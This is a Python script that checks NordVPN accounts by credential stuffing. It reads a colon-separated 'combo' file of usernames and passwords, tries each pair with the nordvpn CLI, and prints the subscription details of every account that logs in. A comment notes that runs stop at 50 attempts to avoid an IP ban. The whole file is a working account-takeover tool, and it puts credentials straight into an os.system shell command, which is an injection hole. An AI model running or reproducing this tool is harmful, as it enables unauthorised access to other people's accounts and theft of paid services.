import os
import subprocess
import time
import sys
import getopt

G = '\033[92m'
W = '\033[93m'
R = '\033[91m'
E = '\033[0m'

try:
    options , args = getopt.getopt(sys.argv[1:], 'f:', 'file=')
except getopt.GetoptError:
    print(R + 'Argument Error' + E)
    sys.exit()
if not options:
    print(R + 'Pass the file !' + E)
    sys.exit()
first_arg = options[0][0]
first_arg_val = options[0][1]
handle = None
if  first_arg in ('-f','--file'):
    if os.path.isfile(first_arg_val):
        handle = open(first_arg_val) 

count = 0 
if handle:
    try:
        first_logout = subprocess.check_output(['nordvpn','logout'])
    except:
        pass
    
    for line in handle:
        count += 1
        user , pas = line.strip().split(':')    # your combo file must be separated by colon : 
        res  = os.system('nordvpn login -u {} -p {}'.format(user,pas))
        info = None

        if res == 0:  # 0 means that there is no error
            info = str(subprocess.check_output(['nordvpn','account'],encoding='437'))
            info = info.split('Account Information:')[1]
            info = info.split('Email Address: ')[1]
            email , info = info.split('VPN Service: ')
            print(str(count)+'-' ,user+':'+pas+'\t'+info)
            os.system('nordvpn logout')
            print()

        else:
            print(str(count)+'- '+user+':'+pas+'\t'+str(info)+'\n')

        if count == 50: # you can change the count but almost after 50 try your IP will ban from Nordvpn servers
            handle.close()
            print(f"We have reached to {count} login")
            exit()
